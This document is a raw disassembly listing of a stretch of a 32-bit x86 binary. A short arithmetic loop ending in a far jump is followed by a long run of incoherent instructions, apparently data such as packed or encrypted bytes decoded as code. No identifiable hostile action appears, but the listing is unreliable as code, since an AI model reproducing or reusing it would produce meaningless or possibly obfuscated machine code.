  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x340d7a6a
  4125d0:	xchg   ebp,eax
  4125d1:	rcr    DWORD PTR [eax],1
  4125d3:	jae    0x412650
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	lock in eax,0xda
  4125dd:	icebp  
  4125de:	push   esi
  4125df:	outs   dx,DWORD PTR ds:[esi]
  4125e0:	cmp    esi,DWORD PTR [ebx-0xa]
  4125e3:	inc    edi
  4125e4:	xchg   DWORD PTR [ebx],ecx
  4125e6:	fwait
  4125e7:	test   DWORD PTR [eax-0x4fd9dd83],ebx
  4125ed:	pusha  
  4125ee:	pop    esi
  4125ef:	cmp    eax,0x5b5b5662
  4125f4:	mov    ah,0xd
  4125f6:	mov    bh,0x56
  4125f8:	pop    ebp
  4125f9:	retf   
  4125fa:	cmp    eax,0x902c02a8
  4125ff:	ret    
  412600:	inc    esp
  412601:	xchg   al,ah
  412603:	cmc    
  412604:	push   edx
  412605:	lock mov al,ds:0x3e139958
  41260b:	and    eax,0x4faf7d16
  412610:	dec    ecx
  412611:	push   ebx
  412612:	xor    al,0x8f
  412614:	outs   dx,BYTE PTR ds:[esi]
  412615:	leave  
  412616:	mov    cl,0x53
  412618:	les    eax,FWORD PTR [ecx+0x6b8ef8c1]
  41261e:	xchg   edi,eax
  41261f:	inc    eax
  412620:	mov    eax,ds:0x82822348
  412625:	fimul  WORD PTR [ecx-0x37]
  412628:	int    0x11
  41262a:	icebp  
  41262b:	in     al,0x3
  41262d:	push   edi
  41262e:	call   0x9bfe3639
  412633:	(bad)  
  412634:	or     al,0x80
  412636:	icebp  
  412637:	pop    esp
  412638:	and    BYTE PTR [edx-0x21],dh
  41263b:	push   ds
  41263c:	push   eax
  41263d:	jg     0x4125da
  41263f:	stc    
  412640:	mov    BYTE PTR [ecx-0x5a],al
  412643:	cmp    bl,bh
  412645:	data16 in al,0x26
  412648:	sub    ch,BYTE PTR [ecx]
  41264a:	lds    ecx,FWORD PTR [esi+eax*1-0x4c347e9c]
  412651:	(bad)  [edi-0x3bc84f02]
  412657:	adc    BYTE PTR [edi+0x1],0xd9
  41265b:	jb     0x41269f
  41265d:	push   ds
  41265e:	stos   DWORD PTR es:[edi],eax
  41265f:	lds    esi,FWORD PTR gs:[eax+0x2d84fffb]
  412666:	ret    
  412667:	retf   
  412668:	and    BYTE PTR [ecx+edi*4],bl
  41266b:	loop   0x41269a
  41266d:	out    dx,al
  41266e:	into   
  41266f:	stos   BYTE PTR es:[edi],al
  412670:	jecxz  0x41265c
  412672:	pop    edi
  412673:	sub    ch,BYTE PTR [esi]
  412675:	fcmove st,st(3)
  412677:	add    al,0x2a
  412679:	fstp   DWORD PTR [edx]
  41267b:	aaa    
  41267c:	repnz fs icebp 
  41267f:	xlat   BYTE PTR ds:[ebx]
  412680:	sub    bl,BYTE PTR [ebx-0x71c65f24]
  412686:	and    al,0x2b
  412688:	je     0x412685
  41268a:	xor    eax,0x114d1dab
  41268f:	enter  0x515e,0x23
  412693:	dec    esi
  412694:	cmc    
  412695:	js     0x412703
  412697:	pause  
  412699:	int3   
  41269a:	push   DWORD PTR [ebx-0x80]
  41269d:	jne    0x4126eb
  41269f:	push   edi
  4126a0:	movzx  esp,BYTE PTR [ebx-0x2c696a76]
  4126a7:	inc    edx
  4126a8:	sbb    bl,BYTE PTR [edx]
  4126aa:	xor    BYTE PTR cs:[edi+0x5d],ah
  4126ae:	jns    0x4126d4
  4126b0:	mov    ebp,0x153ce70d
  4126b5:	pop    ds
  4126b6:	fwait
  4126b7:	cmp    ah,al
  4126b9:	pop    es
  4126ba:	dec    ebx
  4126bb:	hlt    
  4126bc:	popa   
  4126bd:	retf   
  4126be:	adc    eax,DWORD PTR [edx-0x78]
  4126c1:	shl    DWORD PTR [eax],1
  4126c3:	sbb    eax,0x5c5f9735
  4126c8:	call   0xb919a33
  4126cd:	shl    BYTE PTR [eax],1
  4126cf:	iret   
  4126d0:	push   edi
  4126d1:	bound  ebp,QWORD PTR [edx-0x61fe16e9]
  4126d7:	push   edx
  4126d8:	sbb    eax,0x8e3a03c7
  4126dd:	adc    bl,BYTE PTR [ebx+0xd]
  4126e0:	das    
  4126e1:	push   ebp
  4126e2:	jne    0x4126f6
  4126e4:	mov    bh,0xa1
  4126e6:	loop   0x412746
  4126e8:	sub    eax,0x4eabd004
  4126ed:	jne    0x4126fe
  4126ef:	outs   dx,DWORD PTR ds:[esi]
  4126f0:	repnz pop edi
  4126f2:	cmp    eax,0xe52a7ec6
  4126f7:	and    bl,ch
  4126f9:	call   0x212e0e63
  4126fe:	cdq    
  4126ff:	cdq    
  412700:	sbb    eax,0x8951e24
  412705:	jbe    0x412687
  412707:	inc    edi
  412708:	call   0xcd3d:0xb6be8c1a
  41270f:	pop    esi
  412710:	ret    
  412711:	sbb    al,0x79
  412713:	or     DWORD PTR [edi],esi
  412715:	cmp    eax,ebx
  412717:	mov    esp,0x5415b18c
  41271d:	sub    al,0x32
  41271f:	add    eax,0xb242a3d3
  412724:	sbb    DWORD PTR [eax],esp
  412726:	sbb    eax,0x1e2751d3
  41272b:	test   al,0xf9
  41272d:	push   0x575f6dd6
  412732:	das    
  412733:	call   0x4cf2:0x3c07d323
  41273a:	sub    DWORD PTR [eax+0x37],ebx
  41273d:	cli    
  41273e:	jne    0x412749
  412740:	xchg   edx,eax
  412741:	fidivr DWORD PTR [ebp+0x401e60db]
  412747:	sub    edx,eax
  412749:	or     eax,0xfe5b495f
  41274e:	sahf   
  41274f:	mov    edx,0x6d55a083
  412754:	sbb    bl,BYTE PTR [eax+edx*4-0x4dc3f623]
  41275b:	pop    eax
  41275c:	push   ecx
  41275d:	(bad)  
  41275e:	(bad)  
  41275f:	arpl   si,bx
  412761:	lds    ebx,FWORD PTR [ebp-0x57b74bc4]
  412767:	mov    ebp,0x558e3c6e
  41276c:	arpl   WORD PTR [edi-0x6cf5d264],si
  412772:	fist   DWORD PTR [edx-0x3ffa24b3]
  412778:	inc    edx
  412779:	pop    es
  41277a:	cmp    eax,0x411d90f4
  41277f:	inc    esi
  412780:	dec    ebx
  412782:	lahf   
  412783:	push   edi
  412784:	iret   
  412785:	add    bl,BYTE PTR [edx+0x2d180515]
  41278b:	mov    eax,ds:0x7c1e07d5
  412790:	in     eax,0x4a
  412792:	hlt    
  412793:	or     ecx,ebx
  412795:	daa    
  412796:	jmp    0xb12bfb77
  41279b:	xor    ebp,DWORD PTR [esi-0xaecb0db]
  4127a1:	shl    DWORD PTR [ebx+eiz*8+0x6e],0x6
  4127a6:	div    BYTE PTR [eax+0x45]
  4127a9:	xchg   esp,eax
  4127aa:	mov    eax,ds:0x22a99681
  4127af:	aaa    
  4127b0:	xchg   ebx,eax
  4127b1:	js     0x412766
  4127b3:	and    ah,BYTE PTR [ecx+0x32]
  4127b6:	pop    edx
  4127b7:	or     DWORD PTR [edi],edi
  4127b9:	adc    DWORD PTR [eax],0xffffff8b
  4127bc:	pop    edi
  4127bd:	dec    edi
  4127be:	ret    
  4127bf:	inc    eax
  4127c0:	pop    ebp
  4127c1:	inc    edi
  4127c2:	fst    st(5)
  4127c4:	ja     0x412778
  4127c6:	add    BYTE PTR [esi],0x7f
  4127c9:	pop    esi
  4127ca:	sbb    dl,BYTE PTR [ebx]
  4127cc:	mov    dl,0xe1
  4127ce:	int    0xb7
  4127d0:	or     DWORD PTR [ebx],ebx
  4127d2:	out    dx,eax
  4127d3:	xor    DWORD PTR [edi+0x2e2259e6],esi
  4127d9:	mov    eax,ds:0x6a46d7ab
  4127de:	(bad)  
  4127df:	lods   eax,DWORD PTR ds:[esi]
  4127e0:	std    
  4127e1:	pop    ecx
  4127e2:	push   es
  4127e3:	mov    edx,0x2c62332b
  4127e8:	loope  0x41278b
  4127ea:	and    eax,0x9f3c88f0
  4127ef:	daa    
  4127f0:	imul   esp,DWORD PTR [edi+0x1d5bc923],0x5
  4127f7:	rcr    edx,cl
  4127f9:	into   
  4127fa:	ins    DWORD PTR es:[edi],dx
  4127fb:	arpl   di,bp
  4127fd:	adc    esi,DWORD PTR [edi-0x21]
  412800:	fimul  DWORD PTR [ebx]
  412802:	stos   DWORD PTR es:[edi],eax
  412803:	cmp    eax,DWORD PTR [ebp+0x6d]
  412806:	int    0x20
  412808:	jmp    0x720572dc
  41280d:	mov    dl,0x3f
  41280f:	addr16 arpl dx,di
  412812:	ja     0x41284f
  412814:	mov    bl,0x3
  412816:	mov    dl,0xf5
  412818:	aaa    
  412819:	pop    esi
  41281a:	leave  
  41281b:	ret    
  41281c:	or     bl,BYTE PTR [edi]
  41281e:	jns    0x4127b3
  412820:	push   esi
  412821:	ja     0x4127a3
  412823:	mov    ch,0xa4
  412825:	aam    0x6d
  412827:	xchg   BYTE PTR [ebp-0x62c238c2],bh
  41282d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41282e:	or     al,0xbc
  412830:	xchg   edi,eax
  412831:	es mov esp,0xbced4235
  412837:	mov    WORD PTR ds:0x5446723c,fs
  41283d:	xchg   ebx,eax
  41283e:	aaa    
  41283f:	fcomp  QWORD PTR [esi]
  412841:	aaa    
  412842:	ror    BYTE PTR [esp+eax*1+0x18ee2e4d],cl
  412849:	push   ecx
  41284a:	xchg   esi,eax
  41284b:	inc    edx
  41284c:	xchg   ebx,eax
  41284d:	jnp    0x4127d1
  41284f:	aad    0xa4
  412851:	or     DWORD PTR [edi],0xa5875a92
  412857:	mov    ch,0x53
  412859:	mov    ecx,0x680905eb
  41285e:	xchg   ecx,eax
  41285f:	push   ss
  412860:	xchg   ebx,eax
  412861:	jno    0x412862
  412863:	aad    0xee
  412865:	pop    ss
  412866:	xor    BYTE PTR [esi+eiz*1],ch
  412869:	jns    0x4128cb
  41286b:	lods   eax,DWORD PTR ds:[esi]
  41286c:	jb     0x412832
  41286e:	aaa    
  41286f:	mov    ch,0xb6
  412871:	scas   al,BYTE PTR es:[edi]
  412872:	mov    ds,edx
  412874:	push   es
  412875:	repz jnp 0x4128d0
  412878:	xor    al,0x6a
  41287a:	mov    BYTE PTR [ebp+0x74],ah
  41287d:	addr16 test eax,0x41e40219
  412883:	inc    edx
  412884:	fsub   QWORD PTR [edi-0x1f]
  412887:	adc    DWORD PTR [edx],edx
  412889:	mov    ds:0x27598987,eax
  41288e:	repnz pop ebx
  412890:	(bad)  
  412891:	pop    ebp
  412892:	add    al,0x66
  412894:	mov    cl,0x21
  412896:	imul   esp,DWORD PTR [ebx-0x13],0x7e6a2703
  41289d:	outs   dx,DWORD PTR ds:[esi]
  41289e:	adc    BYTE PTR [ebx+esi*1-0x24ee4081],0xd3
  4128a6:	lea    ecx,[eax+0x628cce3f]
  4128ac:	push   ss
  4128ad:	cmp    eax,0xda13b660
  4128b2:	ins    BYTE PTR es:[edi],dx
  4128b3:	sar    DWORD PTR [ecx+0x557d3bcd],0x72
  4128ba:	and    eax,0x93452735
  4128bf:	stos   BYTE PTR es:[edi],al
  4128c0:	iret   
  4128c1:	push   cs
  4128c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128c3:	jecxz  0x41289a
  4128c5:	push   eax
  4128c6:	mov    WORD PTR [esi],ds
  4128c8:	mov    ebp,0x23eaf68f
  4128cd:	sub    dl,BYTE PTR [edi-0x2e]
  4128d0:	jbe    0x4128f0
  4128d2:	scas   al,BYTE PTR es:[edi]
  4128d3:	xor    BYTE PTR [eax+0x61],0x71
  4128d7:	mov    ds:0xafd19bfc,eax
  4128dc:	stos   DWORD PTR es:[edi],eax
  4128dd:	scas   al,BYTE PTR es:[edi]
  4128de:	mov    eax,0xfbfe2960
  4128e3:	pop    eax
  4128e4:	ret    0x64b5
  4128e7:	and    ecx,ecx
  4128e9:	out    dx,al
  4128ea:	and    edx,eax
  4128ec:	pushf  
  4128ed:	test   eax,0x95ae7837
  4128f2:	mov    eax,ds:0xf3404c93
  4128f7:	clc    
  4128f8:	or     BYTE PTR [edx+ebp*2-0x500c20f4],al
  4128ff:	in     eax,dx
  412900:	ja     0x412919
  412902:	mov    ah,0xd9
  412904:	mov    ah,0x63
  412906:	repz cs inc ebx
  412909:	sub    eax,0xbbf2c04c
  41290e:	mov    ch,0xdd
  412910:	out    dx,eax
  412911:	push   es
  412912:	out    0x4b,eax
  412914:	xchg   edx,eax
  412915:	hlt    
  412916:	imul   eax,DWORD PTR [ecx],0xe2fe530a
  41291c:	sbb    al,0x1f
  41291e:	retf   
  41291f:	mov    esi,0x21fed55e
  412924:	dec    edi
  412925:	mov    ebx,0xa5cfeb9e
  41292a:	cmp    eax,ecx
  41292c:	add    DWORD PTR [esi-0x5b],edx
  41292f:	add    ebp,DWORD PTR [ecx-0xc]
  412932:	(bad)  [ebx]
  412934:	mov    edx,DWORD PTR [ebx+ebp*8+0x42353da7]
  41293b:	sub    BYTE PTR [esi],ah
  41293d:	dec    ebx
  41293e:	test   eax,0xd0b3e399
  412943:	sub    al,0xd4
  412945:	jne    0x4129ad
  412947:	inc    ecx
  412948:	inc    esi
  412949:	xchg   edx,eax
  41294a:	sub    dl,BYTE PTR [edi-0x16115ab]
  412950:	or     eax,0x77a1a95e
  412955:	mov    ds:0x9a9abc61,al
  41295a:	outs   dx,BYTE PTR ds:[esi]
  41295b:	cmp    cl,BYTE PTR [edx]
  41295d:	adc    dl,BYTE PTR [ecx]
  41295f:	xchg   ebx,eax
  412960:	cmc    
  412961:	test   BYTE PTR [edi+0x755b0b9d],cl
  412967:	push   ebp
  412968:	imul   ebx,DWORD PTR [ebx+0x55],0x16a71915
  41296f:	inc    ecx
  412970:	cmp    eax,0x6d49f699
  412975:	sbb    ebx,edi
  412977:	sub    DWORD PTR [ecx],0xffffffd5
  41297a:	xchg   ebp,eax
  41297b:	push   cs
  41297c:	jge    0x412972
  41297e:	sub    BYTE PTR [eax+0x527706e9],dl
  412984:	sbb    bl,BYTE PTR [eax]
  412986:	mov    edx,DWORD PTR [edi+0x6abe71b8]
  41298c:	fnstsw ax
  41298e:	jl     0x41292f
  412990:	inc    esi
  412991:	push   0x9
  412993:	add    DWORD PTR [ebx],0xffffff88
  412996:	aas    
  412997:	(bad)  
  412998:	iret   
  412999:	add    esp,ecx
  41299b:	jmp    0x41298b
  41299d:	sub    edi,0x2
  4129a0:	and    BYTE PTR [edi+0x1b],ah
  4129a3:	popa   
  4129a4:	dec    ebx
  4129a5:	dec    edi
  4129a6:	aad    0xf5
  4129a8:	add    eax,0x5b870067
  4129ad:	sub    eax,0x23a6c82e
  4129b2:	dec    ecx
  4129b3:	pop    esp
  4129b4:	jnp    0x412999
  4129b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129b7:	mov    al,0xf6
  4129b9:	push   es
  4129ba:	(bad)  
  4129bb:	test   al,0x83
  4129bd:	inc    ebx
  4129be:	lods   eax,DWORD PTR ds:[esi]
  4129bf:	and    bl,BYTE PTR [edi]
  4129c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c2:	xchg   ebx,eax
  4129c3:	and    edx,DWORD PTR fs:[edx-0x3afc2ed9]
  4129ca:	jmp    FWORD PTR [esi+0x4ac79bf6]
  4129d0:	mov    ah,0xff
  4129d2:	adc    edx,DWORD PTR [edx+0x58]
  4129d5:	fldl2t 
  4129d7:	pop    edi
  4129d8:	xchg   edx,eax
  4129d9:	test   BYTE PTR [edx-0xb],0x40
  4129dd:	xchg   esi,eax
  4129de:	jmp    0x1d5d:0x1db29c86
  4129e5:	push   edi
  4129e6:	sbb    ebp,0x68825746
  4129ec:	adc    eax,0x3658c68
  4129f1:	xchg   edi,eax
  4129f2:	or     cl,BYTE PTR ds:0xe231012b
  4129f9:	retf   
  4129fa:	xor    bl,BYTE PTR [esi+0x4f]
  4129fd:	dec    ebp
  4129fe:	mov    ss,WORD PTR [ecx+eax*8+0x66dcf14]
  412a05:	mov    dl,0x7b
  412a07:	mov    edi,0x62a036ec
  412a0c:	push   edi
  412a0d:	lds    eax,FWORD PTR [ebp+0x173d613c]
  412a13:	out    0xad,al
  412a15:	push   ss
  412a16:	pop    eax
  412a17:	adc    esi,eax
  412a19:	outs   dx,DWORD PTR ds:[esi]
  412a1a:	pop    eax
  412a1b:	xchg   ecx,eax
  412a1c:	inc    ecx
  412a1d:	scas   al,BYTE PTR es:[edi]
  412a1e:	cwde   
  412a1f:	sbb    al,0xb0
  412a21:	inc    edx
  412a22:	adc    eax,0x82f07384
  412a27:	inc    ebp
  412a28:	test   DWORD PTR [eax],ebp
  412a2a:	inc    edi
  412a2b:	sbb    al,0x23
  412a2d:	mov    bl,0x3d
  412a2f:	xchg   BYTE PTR [edx+0x10],dl
  412a32:	cmp    BYTE PTR [edx+0x7c],dl
  412a35:	mov    bl,0xe0
  412a37:	push   0xffffffff
  412a39:	inc    edi
  412a3a:	mov    esp,0x89063cb1
  412a3f:	loope  0x4129ef
  412a41:	and    ah,0x5c
  412a44:	cli    
  412a45:	xchg   ebp,eax
  412a46:	scas   eax,DWORD PTR es:[edi]
  412a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a48:	jmp    0x6c05d9fc
  412a4d:	dec    ebp
  412a4e:	ror    BYTE PTR [ebp-0xc],cl
  412a51:	imul   edx,ecx,0x1ef4b8e9
  412a57:	adc    eax,0xafff58e8
  412a5c:	xchg   esp,eax
  412a5d:	dec    edx
  412a5e:	dec    edi
  412a5f:	and    esi,DWORD PTR [eax+0x62]
  412a62:	jmp    FWORD PTR [esi+0x2ac93599]
  412a68:	jne    0x412a6b
  412a6a:	popf   
  412a6b:	stc    
  412a6c:	into   
  412a6d:	mov    edi,0xf24264f9
  412a72:	or     DWORD PTR [esi],0x854a02f5
  412a78:	inc    esp
  412a79:	dec    ebx
  412a7a:	jo     0x412a4b
  412a7c:	fs adc ch,ah
  412a7f:	and    DWORD PTR [ebp+0x584a3a10],ebx
  412a85:	retf   0x2463
  412a88:	and    al,0x8
  412a8a:	dec    esp
  412a8b:	jmp    0xd468:0x2c92ff91
  412a92:	cmp    ebp,ebx
  412a94:	mov    bh,0xb2
  412a96:	mov    esp,0xb8d9b9da
  412a9b:	je     0x412a87
  412a9d:	fnstcw WORD PTR [edx]
  412a9f:	push   ebx
  412aa0:	into   
  412aa1:	mov    edx,0x41769f4c
  412aa6:	(bad)  
  412aa7:	jmp    0x60439ca9
  412aac:	out    dx,al
  412aad:	jmp    0x412afc
  412aaf:	repnz mov dl,0xc
  412ab2:	pop    ebp
  412ab3:	loopne 0x412a3b
  412ab5:	fld    DWORD PTR [ebp-0x4f0e5a78]
  412abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412abc:	nop
  412abd:	and    bh,BYTE PTR [edx+0x31]
  412ac0:	imul   esi,DWORD PTR [ecx+0x55],0x1115bfbc
  412ac7:	push   ebx
  412ac8:	cmp    BYTE PTR [edi-0x190a1d83],dl
  412ace:	and    cl,BYTE PTR [ebx-0x15]
  412ad1:	dec    esi
  412ad2:	lahf   
  412ad3:	cmp    al,0x18
  412ad5:	(bad)  
  412ad6:	out    0xe4,eax
  412ad8:	sub    ch,0xb2
  412adb:	push   ebp
  412adc:	unpcklps xmm5,XMMWORD PTR [ebx]
  412adf:	add    al,0xcd
  412ae1:	pop    edi
  412ae2:	xchg   BYTE PTR ds:0xc5b97b11,bl
  412ae8:	inc    esi
  412ae9:	test   eax,0x5276df5d
  412aee:	push   0x2b
  412af0:	mov    bh,0xfa
  412af2:	repnz sbb cl,BYTE PTR ds:0xf969e370
  412af9:	xchg   ebx,eax
  412afa:	ds aad 0xff
  412afd:	(bad)  
  412afe:	bound  eax,QWORD PTR [ebx+ebx*2]
  412b01:	pusha  
  412b02:	les    edi,FWORD PTR [ebp-0x4a17f36e]
  412b08:	(bad)  
  412b09:	pop    ds
  412b0a:	push   ss
  412b0b:	fmul   DWORD PTR [esi+0x588369b9]
  412b11:	push   edi
  412b12:	adc    edx,ecx
  412b14:	jge    0x412b20
  412b16:	retf   0x5091
  412b19:	and    edi,DWORD PTR [esi]
  412b1b:	sbb    dh,bl
  412b1d:	push   ebx
  412b1e:	je     0x412aad
  412b20:	add    bh,BYTE PTR [esi+esi*4]
  412b23:	pop    eax
  412b24:	inc    esp
  412b25:	call   0xca06:0xf8f2df20
  412b2c:	pop    edi
  412b2d:	xor    eax,0x787fdd1c
  412b32:	cmp    eax,0xd5fec758
  412b37:	dec    edi
  412b38:	cmp    eax,0x62d6180
  412b3d:	jecxz  0x412b1e
  412b3f:	dec    edi
  412b40:	xor    esi,edx
  412b42:	hlt    
  412b43:	jb     0x412b25
  412b45:	clc    
  412b46:	sub    bl,BYTE PTR [edi]
  412b48:	imul   ecx,ebp,0xffffffab
  412b4b:	cmp    DWORD PTR [edi],edi
  412b4d:	sbb    al,0x1a
  412b4f:	mov    ebp,0xdb23e735
  412b54:	nop
  412b55:	mov    al,ds:0x463e78f2
  412b5a:	adc    eax,0x15b5da89
  412b5f:	pop    edx
  412b60:	aaa    
  412b61:	mov    edi,0xc267db76
  412b66:	adc    BYTE PTR [eax+ebx*2-0x65],al
  412b6a:	sbb    BYTE PTR [eax+0x4ecc8ed6],ah
  412b70:	aad    0xac
  412b72:	push   cs
  412b73:	cmp    al,0x63
  412b75:	out    dx,al
  412b76:	adc    ebp,DWORD PTR [esi+0x5e96279]
  412b7c:	sbb    esp,DWORD PTR [ebx]
  412b7e:	les    ecx,FWORD PTR ds:0x9aa6bac7
  412b84:	jp     0x412bbb
  412b86:	cs pushf 
  412b88:	xlat   BYTE PTR ds:[ebx]
  412b89:	jp     0x412b22
  412b8b:	pop    ecx
  412b8c:	mov    ebx,0x57613331
  412b91:	mov    eax,ds:0xc54a9376
  412b96:	cmp    al,dh
  412b98:	into   
  412b99:	sbb    DWORD PTR [ecx],esi
  412b9b:	inc    ebx
  412b9c:	or     BYTE PTR [eax-0x4c],al
  412b9f:	xchg   edi,eax
  412ba0:	lahf   
  412ba1:	es fmulp st(1),st
  412ba4:	int    0x89
  412ba6:	dec    ebx
  412ba7:	cmp    BYTE PTR [ecx+0x63],ch
  412baa:	dec    ebx
  412bab:	out    0x55,al
  412bad:	sub    BYTE PTR [ebx+0x5fcf3a7f],bh
  412bb3:	iret   
  412bb4:	lea    esi,[ebx-0x72aba036]
  412bba:	xchg   DWORD PTR [ebx+0x4],ebx
  412bbd:	mov    edx,0xa74e540
  412bc2:	add    BYTE PTR [ebx-0x47c6b3c],bh
  412bc8:	in     eax,dx
  412bc9:	or     ch,cl
  412bcb:	outs   dx,BYTE PTR ds:[esi]
  412bcc:	jge    0x412c21
  412bce:	inc    esp
  412bcf:	mov    WORD PTR [eax-0x3f41801c],cs
  412bd5:	aam    0x1d
  412bd7:	push   es
  412bd8:	stos   DWORD PTR es:[edi],eax
  412bd9:	test   DWORD PTR [eax],0x43da6ffb
  412bdf:	in     al,dx
  412be0:	jns    0x412c0d
  412be2:	and    DWORD PTR [esi-0x61],ebp
  412be5:	push   ebx
  412be6:	fimul  DWORD PTR ds:0x14b63e57
  412bec:	retf   0x7579
  412bef:	call   0x3367ba3c
  412bf4:	pop    eax
  412bf5:	mov    edx,0xb2e3dc87
  412bfa:	dec    ebx
  412bfb:	sahf   
  412bfc:	cdq    
  412bfd:	sti    
  412bfe:	les    eax,FWORD PTR [ebx]
  412c00:	ret    
  412c01:	jne    0x412bae
  412c03:	lods   al,BYTE PTR ds:[esi]
  412c04:	or     esi,DWORD PTR ds:0x8502fbe4
  412c0a:	sub    DWORD PTR [edx],ebp
  412c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c0d:	icebp  
  412c0e:	pushf  
  412c0f:	mov    ecx,0xa022876
  412c14:	add    DWORD PTR [ecx*1+0x347da194],0xfffffff6
  412c1c:	sbb    ch,BYTE PTR [ebp+0x73]
  412c1f:	sbb    eax,0x72765323
  412c24:	mov    ch,0x88
  412c26:	inc    edx
  412c27:	and    eax,0x37768a0b
  412c2c:	mov    cl,0xbd
  412c2e:	pop    ebx
  412c2f:	xor    ah,BYTE PTR [edx]
  412c31:	xchg   esp,eax
  412c32:	aas    
  412c33:	jl     0x412bfa
  412c35:	fcmovnbe st,st(0)
  412c37:	retf   0x7211
  412c3a:	jg     0x412c77
  412c3c:	xor    DWORD PTR [ebp+0x55],edx
  412c3f:	mov    al,ds:0x80c4e57c
  412c44:	mov    dh,0xce
  412c46:	xor    eax,0x8d05b0e2
  412c4b:	imul   edi,DWORD PTR [ecx+esi*4+0xdd93525],0x6b
  412c53:	fild   WORD PTR [ecx+0x7c]
  412c56:	xor    eax,0xa6190653
  412c5b:	int    0x18
  412c5d:	mov    cl,0x6b
  412c5f:	or     eax,0xe183cae5
  412c64:	sbb    BYTE PTR [esi+0x2bba2596],bh
  412c6a:	push   ss
  412c6b:	popf   
  412c6c:	fnstcw WORD PTR [ebp+0x44c892bb]
  412c72:	jp     0x412bf5
  412c74:	mov    dl,0x82
  412c76:	sbb    esi,ecx
  412c78:	inc    eax
  412c79:	mov    esp,0xff9586cb
  412c7e:	push   edx
  412c7f:	sbb    dl,ah
  412c81:	jmp    0x193c:0xa7819d1b
  412c88:	ret    
  412c89:	das    
  412c8a:	jg     0x412cf4
  412c8c:	jbe    0x412cae
  412c8e:	xor    DWORD PTR [eax+ebx*1],esi
  412c91:	arpl   bx,dx
  412c93:	jnp    0x412c6a
  412c95:	jp     0x412c43
  412c97:	dec    ebx
  412c98:	inc    edx
  412c99:	fisttp WORD PTR [ebx+eiz*8+0xa]
  412c9d:	add    ebx,DWORD PTR [edi-0x7c3511b0]
  412ca3:	out    dx,eax
  412ca4:	ret    
  412ca5:	pavgb  mm1,QWORD PTR ds:0x5a7df851
  412cac:	out    0xff,al
  412cae:	les    ecx,FWORD PTR [edi+0x6]
  412cb1:	lock ds icebp 
  412cb4:	ret    0x71aa
  412cb7:	jmp    0x2d31:0xbb2888b1
  412cbe:	pop    ebx
  412cbf:	fnstcw WORD PTR [ebp-0x4d]
  412cc2:	adc    DWORD PTR [esi],0xcc80788
  412cc8:	pop    ecx
  412cc9:	je     0x412cfd
  412ccb:	pop    ebp
  412ccc:	dec    ecx
  412ccd:	mov    ah,0xa0
  412ccf:	adc    DWORD PTR [edi-0x23],edx
  412cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cd3:	retf   
  412cd4:	mov    bl,0xb0
  412cd6:	and    eax,0xa43760cb
  412cdb:	je     0x412d24
  412cdd:	pop    esp
  412cde:	scas   eax,DWORD PTR es:[edi]
  412cdf:	xchg   ecx,eax
  412ce0:	stc    
  412ce1:	xchg   esp,eax
  412ce2:	inc    ecx
  412ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ce4:	adc    DWORD PTR [edx+ecx*1+0x4ffe8c4d],edi
  412ceb:	addr16 pushf 
  412ced:	bswap  edi
  412cef:	mov    al,0x9b
  412cf1:	dec    esp
  412cf2:	sub    DWORD PTR [edi-0x7e],0xdb697c0
  412cf9:	sbb    eax,0x609cb5d4
  412cfe:	sub    eax,0xce22d030
  412d03:	in     al,0x3d
  412d05:	test   DWORD PTR [edi],0x29eaa08f
  412d0b:	mov    ah,0x8
  412d0d:	cmp    ah,dl
  412d0f:	mov    eax,0x7f2b856d
  412d14:	sbb    eax,0xf0c2921c
  412d19:	push   esi
  412d1a:	arpl   WORD PTR [ebp-0x28f706a5],bx
  412d20:	icebp  
  412d21:	adc    DWORD PTR [edx-0x24cfec7d],esp
  412d27:	aaa    
  412d28:	sbb    bh,cl
  412d2a:	and    bl,dl
  412d2c:	repnz in eax,dx
  412d2e:	int    0x86
  412d30:	mov    ch,cl
  412d32:	ret    0xe317
  412d35:	push   edi
  412d36:	mov    esp,0x98c1834
  412d3b:	call   0xd32125c7
  412d40:	mov    bh,0xed
  412d42:	cli    
  412d43:	pop    edx
  412d44:	push   0xf29a2824
  412d49:	loop   0x412d7c
  412d4b:	jb     0x412cd1
  412d4d:	fwait
  412d4e:	popa   
  412d4f:	lods   eax,DWORD PTR ds:[esi]
  412d50:	xchg   ebx,eax
  412d51:	test   BYTE PTR [ebx-0x5e6324f1],ch
  412d57:	stc    
  412d58:	add    ecx,DWORD PTR [ebp+0x6300c0d9]
  412d5e:	js     0x412cfa
  412d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d61:	push   es
  412d62:	mov    ah,0x23
  412d64:	sbb    eax,0xd337b9ea
  412d69:	call   0x25771d8a
  412d6e:	push   edi
  412d6f:	enter  0xa77f,0x7a
